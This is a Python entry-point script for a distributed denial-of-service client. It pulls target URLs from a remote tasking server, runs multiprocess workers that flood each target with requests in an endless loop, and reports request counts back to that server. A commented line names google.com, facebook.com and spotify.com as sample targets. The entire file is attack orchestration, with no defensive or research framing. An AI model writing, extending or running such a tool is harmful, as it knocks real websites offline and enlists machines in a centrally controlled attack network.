import sys
from itertools import repeat
from multiprocessing import Pool, Manager
from typing import Dict

from termcolor import cprint
from src.ddos_api_client import DdosApiClient
from src.ddos_worker import DdosWorker
from src.utils.args_utils import get_cli_arguments
from src.config import API_HOST

args = get_cli_arguments()
threads_count = args.threads
client_name = args.name
processes_count = 8


def print_executed_count(executed_count: Dict):
    print('\r', end='')
    for i, (url, count) in enumerate(executed_count.items()):
        print(f'{count} requests to {url}; ', end='')


def run(worker: DdosWorker, executed_count: Dict):
    while True:
        worker.run_concurrent(threads_count)
        executed_count[worker.target] += threads_count
        print_executed_count(executed_count)


def main():
    api_instance = DdosApiClient(url=API_HOST, client_name=client_name)
    active_tasks = api_instance.get_active_tasks()
    # active_tasks = ['https://google.com', 'https://facebook.com', 'https://spotify.com']

    workers = [DdosWorker(target_url) for target_url in active_tasks]

    manager = Manager()
    executed_counts = manager.dict({url: 0 for url in active_tasks})

    cprint(f'[*] Start sending requests', 'cyan')

    try:
        with Pool(processes_count) as pool:
            pool.starmap(run, zip(workers, repeat(executed_counts)))
    except KeyboardInterrupt:
        sys.exit(cprint('\n[-] Canceled by user', 'red'))
    except Exception as e:
        sys.exit(cprint(f'\n[-] Something failed, exiting... {e}', 'red'))
    finally:
        api_instance.submit_progress(processes_count, executed_counts)
        cprint('\n[*] Successfully submitted requests stats', 'green')


if __name__ == '__main__':
    main()
